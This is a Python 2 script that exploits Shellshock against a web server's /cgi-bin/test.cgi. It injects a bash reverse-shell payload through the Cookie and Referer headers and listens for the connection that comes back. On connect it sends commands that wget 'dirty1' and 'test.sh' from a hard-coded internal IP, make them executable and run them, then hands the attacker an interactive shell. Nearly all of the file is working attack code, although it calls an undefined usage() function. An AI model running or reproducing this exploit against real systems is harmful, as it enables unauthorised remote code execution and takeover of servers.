#! /usr/bin/env python
from socket import *
from threading import Thread
import thread, time, httplib, urllib, sys 

stop = False
proxyhost = ""
proxyport = 0

#Main explout method, specifically targeting the mod_cgi method of attack. 
def exploit(lhost,lport,rhost):
	payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
	headers = {"Cookie": payload, "Referer": payload}
	
	if proxyhost != "":
		c = httplib.HTTPConnection(proxyhost,proxyport)
		c.request("GET","http://"+rhost+"/cgi-bin/test.cgi",headers=headers)
		res = c.getresponse()
	else:
		c = httplib.HTTPConnection(rhost)
		c.request("GET","/cgi-bin/test.cgi",headers=headers)
		res = c.getresponse()
	
		

args = {}
	
for arg in sys.argv[1:]:
	ar = arg.split("=")
	args[ar[0]] = ar[1]
try:
	args['payload']
except:
	usage()
	
if args['payload'] == 'reverse':
	try:
		lhost = args['lhost']
		lport = int(args['lport'])
		rhost = args['rhost']
		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
	except:
		usage()
else:
	print "[*] Unsupported payload"
	usage()

			
if args['payload'] == 'reverse':
	serversocket = socket(AF_INET, SOCK_STREAM)
	buff = 1024
	addr = (lhost, lport)
	serversocket.bind(addr)
	serversocket.listen(10)
	print "[!] Started reverse shell handler" 
	thread.start_new_thread(exploit,(lhost,lport,rhost))
	
buff = 1024
	
while True:
	if args['payload'] == 'reverse':
		clientsocket, clientaddr = serversocket.accept()
		print "[!] Successfully exploited"
		print "[!] Incoming connection from "+clientaddr[0]
		
		clientsocket.sendall("wget -P /var/crash http://192.168.72.151:8000/dirty1 && wget -P /var/crash http://192.168.72.151:8000/test.sh && chmod +x /var/crash/test.sh && sh /var/crash/test.sh"+"\n")
		
		
		stop = True
		clientsocket.settimeout(3)
		while True:
			reply = raw_input(clientaddr[0]+"> ")
			clientsocket.sendall(reply+"\n")
			try:
				data = clientsocket.recv(buff)
				print data
			except:
				pass
